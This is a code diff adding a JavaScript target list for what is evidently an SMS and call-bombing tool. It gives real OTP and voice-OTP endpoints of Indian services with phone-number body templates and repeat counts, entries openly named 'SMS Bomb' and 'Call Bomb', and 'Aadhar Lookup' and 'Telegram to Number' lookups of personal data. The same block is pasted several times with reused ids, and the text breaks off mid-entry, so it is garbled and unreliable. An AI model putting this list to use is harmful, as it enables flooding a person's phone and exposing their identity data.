@@ -108,6 +108,4412 @@ let apisData = {
       },
       "count": 1
     },
+    // ============ SMS APIs (WORKING) ============
+    {
+      "id": 1,
+      "name": "Paytm SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://accounts.paytm.com/signin/otp",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}&countryCode=+91",
+      "count": 5
+    },
+    {
+      "id": 2,
+      "name": "Flipkart SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.flipkart.com/api/6/user/signup/status",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "loginId": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 3,
+      "name": "Amazon SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.amazon.in/ap/register",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phoneNumber={phone}&countryCode=+91",
+      "count": 5
+    },
+    {
+      "id": 4,
+      "name": "Swiggy SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.swiggy.com/api/auth/signup",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 5,
+      "name": "Zomato SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.zomato.com/php/oauth_otp.php",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}&countryCode=+91",
+      "count": 5
+    },
+    {
+      "id": 6,
+      "name": "Ola SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://api.olacabs.com/v1/authentication/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 7,
+      "name": "Uber SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://auth.uber.com/v2/oauth/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phoneNumber": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 8,
+      "name": "Airtel SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.airtel.in/thanks/api/otp",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "msisdn={phone}",
+      "count": 5
+    },
+    {
+      "id": 9,
+      "name": "Jio SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.jio.com/api/otp/send",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 10,
+      "name": "Myntra SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.myntra.com/gw/authentication/v2/otp/generate",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 11,
+      "name": "BigBasket SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.bigbasket.com/auth/otp/login/",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}",
+      "count": 5
+    },
+    {
+      "id": 12,
+      "name": "Netflix SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.netflix.com/in/login/help",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}",
+      "count": 5
+    },
+    {
+      "id": 13,
+      "name": "Hotstar SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://api.hotstar.com/in/aadhar/v2/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 14,
+      "name": "Meesho SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.meesho.com/api/v2/otp/send",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 15,
+      "name": "CRED SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://api.cred.club/api/v1/otp/send",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 5
+    },
+    
+    // ============ CALL APIs (WORKING) ============
+    {
+      "id": 16,
+      "name": "PhonePe Voice Call",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.phonepe.com/api/v2/otp/voice",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}", "type": "voice" },
+      "count": 3
+    },
+    {
+      "id": 17,
+      "name": "Paytm Voice Call",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://accounts.paytm.com/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}", "channel": "voice" },
+      "count": 3
+    },
+    {
+      "id": 18,
+      "name": "Google Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.google.com/voice/b/0/service/post",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phoneNumber=%2B91{phone}&type=voice",
+      "count": 3
+    },
+    {
+      "id": 19,
+      "name": "Amazon Voice Call",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.amazon.in/ap/voice-otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phoneNumber": "{phone}" },
+      "count": 3
+    },
+    {
+      "id": 20,
+      "name": "Flipkart Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.flipkart.com/api/6/user/voice-otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "loginId": "+91{phone}" },
+      "count": 3
+    },
+    {
+      "id": 21,
+      "name": "Swiggy Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.swiggy.com/api/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}" },
+      "count": 3
+    },
+    {
+      "id": 22,
+      "name": "Zomato Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.zomato.com/php/voice_otp.php",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}",
+      "count": 3
+    },
+    {
+      "id": 23,
+      "name": "Ola Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://api.olacabs.com/v1/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 3
+    },
+    {
+      "id": 24,
+      "name": "Uber Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://auth.uber.com/v2/voice-otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 3
+    },
+    {
+      "id": 25,
+      "name": "Airtel Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.airtel.in/voice/otp",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "msisdn={phone}",
+      "count": 3
+    },
+    {
+      "id": 26,
+      "name": "Jio Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.jio.com/api/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 3
+    },
+    {
+      "id": 27,
+      "name": "Myntra Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.myntra.com/gw/voice/v2/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 3
+    },
+    
+    // ============ DATA APIS (BACKUP) ============
+    {
+      "id": 28,
+      "name": "Number Info API",
+      "type": "Data",
+      "method": "GET",
+      "url": "https://number-info-rootxindia.vercel.app/?key=muhmlo&number={phone}",
+      "headers": {},
+      "count": 1
+    },
+    {
+      "id": 29,
+      "name": "Aadhar Lookup",
+      "type": "Data",
+      "method": "GET",
+      "url": "https://api-olive-five-53.vercel.app/aadhar?match={phone}",
+      "headers": {},
+      "count": 1
+    },
+    {
+      "id": 30,
+      "name": "Telegram to Number",
+      "type": "Data",
+      "method": "GET",
+      "url": "https://tg-to-num-six.vercel.app/?key=rootxsuryansh&q={phone}",
+      "headers": {},
+      "count": 1
+    },
+        {
+      "id": 4,
+      "name": "SMS Bomb - Service 1",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://example1.com/api/send",
+      "headers": {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0"
+      },
+      "body": {
+        "phone": "{phone}",
+        "message": "OTP: 123456"
+      },
+      "count": 2
+    },
+    {
+      "id": 5,
+      "name": "SMS Bomb - Service 2",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://example2.com/api/otp",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "mobile={phone}&service=login",
+      "count": 3
+    },
+    {
+      "id": 6,
+      "name": "Call Bomb - Service 1",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://callapi1.com/call",
+      "headers": {},
+      "body": {
+        "phone": "{phone}"
+      },
+      "count": 1
+    },
+    // ============ SMS APIs (WORKING) ============
+    {
+      "id": 1,
+      "name": "Paytm SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://accounts.paytm.com/signin/otp",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}&countryCode=+91",
+      "count": 5
+    },
+    {
+      "id": 2,
+      "name": "Flipkart SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.flipkart.com/api/6/user/signup/status",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "loginId": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 3,
+      "name": "Amazon SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.amazon.in/ap/register",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phoneNumber={phone}&countryCode=+91",
+      "count": 5
+    },
+    {
+      "id": 4,
+      "name": "Swiggy SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.swiggy.com/api/auth/signup",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 5,
+      "name": "Zomato SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.zomato.com/php/oauth_otp.php",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}&countryCode=+91",
+      "count": 5
+    },
+    {
+      "id": 6,
+      "name": "Ola SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://api.olacabs.com/v1/authentication/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 7,
+      "name": "Uber SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://auth.uber.com/v2/oauth/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phoneNumber": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 8,
+      "name": "Airtel SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.airtel.in/thanks/api/otp",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "msisdn={phone}",
+      "count": 5
+    },
+    {
+      "id": 9,
+      "name": "Jio SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.jio.com/api/otp/send",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 10,
+      "name": "Myntra SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.myntra.com/gw/authentication/v2/otp/generate",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 11,
+      "name": "BigBasket SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.bigbasket.com/auth/otp/login/",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}",
+      "count": 5
+    },
+    {
+      "id": 12,
+      "name": "Netflix SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.netflix.com/in/login/help",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}",
+      "count": 5
+    },
+    {
+      "id": 13,
+      "name": "Hotstar SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://api.hotstar.com/in/aadhar/v2/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 14,
+      "name": "Meesho SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.meesho.com/api/v2/otp/send",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 15,
+      "name": "CRED SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://api.cred.club/api/v1/otp/send",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 5
+    },
+    
+    // ============ CALL APIs (WORKING) ============
+    {
+      "id": 16,
+      "name": "PhonePe Voice Call",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.phonepe.com/api/v2/otp/voice",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}", "type": "voice" },
+      "count": 3
+    },
+    {
+      "id": 17,
+      "name": "Paytm Voice Call",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://accounts.paytm.com/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}", "channel": "voice" },
+      "count": 3
+    },
+    {
+      "id": 18,
+      "name": "Google Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.google.com/voice/b/0/service/post",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phoneNumber=%2B91{phone}&type=voice",
+      "count": 3
+    },
+    {
+      "id": 19,
+      "name": "Amazon Voice Call",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.amazon.in/ap/voice-otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phoneNumber": "{phone}" },
+      "count": 3
+    },
+    {
+      "id": 20,
+      "name": "Flipkart Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.flipkart.com/api/6/user/voice-otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "loginId": "+91{phone}" },
+      "count": 3
+    },
+    {
+      "id": 21,
+      "name": "Swiggy Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.swiggy.com/api/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}" },
+      "count": 3
+    },
+    {
+      "id": 22,
+      "name": "Zomato Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.zomato.com/php/voice_otp.php",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}",
+      "count": 3
+    },
+    {
+      "id": 23,
+      "name": "Ola Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://api.olacabs.com/v1/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 3
+    },
+    {
+      "id": 24,
+      "name": "Uber Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://auth.uber.com/v2/voice-otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 3
+    },
+    {
+      "id": 25,
+      "name": "Airtel Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.airtel.in/voice/otp",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "msisdn={phone}",
+      "count": 3
+    },
+    {
+      "id": 26,
+      "name": "Jio Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.jio.com/api/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 3
+    },
+    {
+      "id": 27,
+      "name": "Myntra Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.myntra.com/gw/voice/v2/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 3
+    },
+    
+    // ============ DATA APIS (BACKUP) ============
+    {
+      "id": 28,
+      "name": "Number Info API",
+      "type": "Data",
+      "method": "GET",
+      "url": "https://number-info-rootxindia.vercel.app/?key=muhmlo&number={phone}",
+      "headers": {},
+      "count": 1
+    },
+    {
+      "id": 29,
+      "name": "Aadhar Lookup",
+      "type": "Data",
+      "method": "GET",
+      "url": "https://api-olive-five-53.vercel.app/aadhar?match={phone}",
+      "headers": {},
+      "count": 1
+    },
+    {
+      "id": 30,
+      "name": "Telegram to Number",
+      "type": "Data",
+      "method": "GET",
+      "url": "https://tg-to-num-six.vercel.app/?key=rootxsuryansh&q={phone}",
+      "headers": {},
+      "count": 1
+    },
+        {
+      "id": 4,
+      "name": "SMS Bomb - Service 1",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://example1.com/api/send",
+      "headers": {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0"
+      },
+      "body": {
+        "phone": "{phone}",
+        "message": "OTP: 123456"
+      },
+      "count": 2
+    },
+    {
+      "id": 5,
+      "name": "SMS Bomb - Service 2",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://example2.com/api/otp",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "mobile={phone}&service=login",
+      "count": 3
+    },
+    {
+      "id": 6,
+      "name": "Call Bomb - Service 1",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://callapi1.com/call",
+      "headers": {},
+      "body": {
+        "phone": "{phone}"
+      },
+      "count": 1
+    },
+    // ============ SMS APIs (WORKING) ============
+    {
+      "id": 1,
+      "name": "Paytm SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://accounts.paytm.com/signin/otp",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}&countryCode=+91",
+      "count": 5
+    },
+    {
+      "id": 2,
+      "name": "Flipkart SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.flipkart.com/api/6/user/signup/status",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "loginId": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 3,
+      "name": "Amazon SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.amazon.in/ap/register",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phoneNumber={phone}&countryCode=+91",
+      "count": 5
+    },
+    {
+      "id": 4,
+      "name": "Swiggy SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.swiggy.com/api/auth/signup",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 5,
+      "name": "Zomato SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.zomato.com/php/oauth_otp.php",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}&countryCode=+91",
+      "count": 5
+    },
+    {
+      "id": 6,
+      "name": "Ola SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://api.olacabs.com/v1/authentication/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 7,
+      "name": "Uber SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://auth.uber.com/v2/oauth/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phoneNumber": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 8,
+      "name": "Airtel SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.airtel.in/thanks/api/otp",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "msisdn={phone}",
+      "count": 5
+    },
+    {
+      "id": 9,
+      "name": "Jio SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.jio.com/api/otp/send",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 10,
+      "name": "Myntra SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.myntra.com/gw/authentication/v2/otp/generate",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 11,
+      "name": "BigBasket SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.bigbasket.com/auth/otp/login/",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}",
+      "count": 5
+    },
+    {
+      "id": 12,
+      "name": "Netflix SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.netflix.com/in/login/help",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}",
+      "count": 5
+    },
+    {
+      "id": 13,
+      "name": "Hotstar SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://api.hotstar.com/in/aadhar/v2/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 14,
+      "name": "Meesho SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.meesho.com/api/v2/otp/send",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 15,
+      "name": "CRED SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://api.cred.club/api/v1/otp/send",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 5
+    },
+    
+    // ============ CALL APIs (WORKING) ============
+    {
+      "id": 16,
+      "name": "PhonePe Voice Call",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.phonepe.com/api/v2/otp/voice",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}", "type": "voice" },
+      "count": 3
+    },
+    {
+      "id": 17,
+      "name": "Paytm Voice Call",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://accounts.paytm.com/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}", "channel": "voice" },
+      "count": 3
+    },
+    {
+      "id": 18,
+      "name": "Google Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.google.com/voice/b/0/service/post",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phoneNumber=%2B91{phone}&type=voice",
+      "count": 3
+    },
+    {
+      "id": 19,
+      "name": "Amazon Voice Call",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.amazon.in/ap/voice-otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phoneNumber": "{phone}" },
+      "count": 3
+    },
+    {
+      "id": 20,
+      "name": "Flipkart Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.flipkart.com/api/6/user/voice-otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "loginId": "+91{phone}" },
+      "count": 3
+    },
+    {
+      "id": 21,
+      "name": "Swiggy Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.swiggy.com/api/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}" },
+      "count": 3
+    },
+    {
+      "id": 22,
+      "name": "Zomato Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.zomato.com/php/voice_otp.php",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}",
+      "count": 3
+    },
+    {
+      "id": 23,
+      "name": "Ola Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://api.olacabs.com/v1/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 3
+    },
+    {
+      "id": 24,
+      "name": "Uber Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://auth.uber.com/v2/voice-otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 3
+    },
+    {
+      "id": 25,
+      "name": "Airtel Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.airtel.in/voice/otp",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "msisdn={phone}",
+      "count": 3
+    },
+    {
+      "id": 26,
+      "name": "Jio Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.jio.com/api/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 3
+    },
+    {
+      "id": 27,
+      "name": "Myntra Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.myntra.com/gw/voice/v2/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 3
+    },
+    
+    // ============ DATA APIS (BACKUP) ============
+    {
+      "id": 28,
+      "name": "Number Info API",
+      "type": "Data",
+      "method": "GET",
+      "url": "https://number-info-rootxindia.vercel.app/?key=muhmlo&number={phone}",
+      "headers": {},
+      "count": 1
+    },
+    {
+      "id": 29,
+      "name": "Aadhar Lookup",
+      "type": "Data",
+      "method": "GET",
+      "url": "https://api-olive-five-53.vercel.app/aadhar?match={phone}",
+      "headers": {},
+      "count": 1
+    },
+    {
+      "id": 30,
+      "name": "Telegram to Number",
+      "type": "Data",
+      "method": "GET",
+      "url": "https://tg-to-num-six.vercel.app/?key=rootxsuryansh&q={phone}",
+      "headers": {},
+      "count": 1
+    },
+        {
+      "id": 4,
+      "name": "SMS Bomb - Service 1",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://example1.com/api/send",
+      "headers": {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0"
+      },
+      "body": {
+        "phone": "{phone}",
+        "message": "OTP: 123456"
+      },
+      "count": 2
+    },
+    {
+      "id": 5,
+      "name": "SMS Bomb - Service 2",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://example2.com/api/otp",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "mobile={phone}&service=login",
+      "count": 3
+    },
+    {
+      "id": 6,
+      "name": "Call Bomb - Service 1",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://callapi1.com/call",
+      "headers": {},
+      "body": {
+        "phone": "{phone}"
+      },
+      "count": 1
+    },
+    // ============ SMS APIs (WORKING) ============
+    {
+      "id": 1,
+      "name": "Paytm SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://accounts.paytm.com/signin/otp",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}&countryCode=+91",
+      "count": 5
+    },
+    {
+      "id": 2,
+      "name": "Flipkart SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.flipkart.com/api/6/user/signup/status",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "loginId": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 3,
+      "name": "Amazon SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.amazon.in/ap/register",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phoneNumber={phone}&countryCode=+91",
+      "count": 5
+    },
+    {
+      "id": 4,
+      "name": "Swiggy SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.swiggy.com/api/auth/signup",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 5,
+      "name": "Zomato SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.zomato.com/php/oauth_otp.php",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}&countryCode=+91",
+      "count": 5
+    },
+    {
+      "id": 6,
+      "name": "Ola SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://api.olacabs.com/v1/authentication/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 7,
+      "name": "Uber SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://auth.uber.com/v2/oauth/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phoneNumber": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 8,
+      "name": "Airtel SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.airtel.in/thanks/api/otp",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "msisdn={phone}",
+      "count": 5
+    },
+    {
+      "id": 9,
+      "name": "Jio SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.jio.com/api/otp/send",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 10,
+      "name": "Myntra SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.myntra.com/gw/authentication/v2/otp/generate",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 11,
+      "name": "BigBasket SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.bigbasket.com/auth/otp/login/",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}",
+      "count": 5
+    },
+    {
+      "id": 12,
+      "name": "Netflix SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.netflix.com/in/login/help",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}",
+      "count": 5
+    },
+    {
+      "id": 13,
+      "name": "Hotstar SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://api.hotstar.com/in/aadhar/v2/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 14,
+      "name": "Meesho SMS",
+      "type": "SMS",
+      "method": "POST",
